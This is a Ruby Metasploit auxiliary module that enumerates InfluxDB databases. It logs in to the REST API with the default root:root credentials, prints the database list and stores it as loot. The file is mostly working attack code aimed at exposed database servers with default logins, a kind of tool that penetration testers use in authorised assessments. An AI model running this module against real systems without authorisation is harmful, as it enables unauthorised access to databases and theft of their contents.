##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'InfluxDB Enum Utility',
      'Description'    => %q{
        This module enumerates databases on InfluxDB using the REST API
        (using default authentication - root:root).
      },
      'References'     =>
        [
          ['URL', 'http://influxdb.com/docs/v0.9/concepts/reading_and_writing_data.html']
        ],
      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8086),
        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/db']),
        OptString.new('USERNAME', [true, 'The username to login as', 'root']),
        OptString.new('PASSWORD', [true, 'The password to login with', 'root'])
      ], self.class)
  end

  def run
    username = datastore['USERNAME']
    password = datastore['PASSWORD']

    res = send_request_cgi(
      'uri'           => normalize_uri(target_uri.path),
      'method'        => 'GET',
      'authorization' => basic_auth(username, password)
    )

    if res && res.code == 401
      print_error("#{peer} - Failed to authenticate. Invalid username/password.")
      return
    end

    if res.code == 200 && res.headers['X-Influxdb-Version'].include?('InfluxDB') && res.body.length > 0
      print_status('Enumerating...')
      begin
        temp = JSON.parse(res.body)
        results = JSON.pretty_generate(temp)
      rescue JSON::ParserError
        print_error('Unable to parse JSON data for the response.')
      end

      print_good("Found:\n\n#{results}\n")

      path = store_loot(
        'influxdb.enum',
        'text/plain',
        rhost,
        results,
        'InfluxDB Enum'
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Unable to enum, received \"#{res.code}\".")
    end
  rescue => e
    print_error("#{peer} - The following Error was encountered: #{e.class}")
  end
end
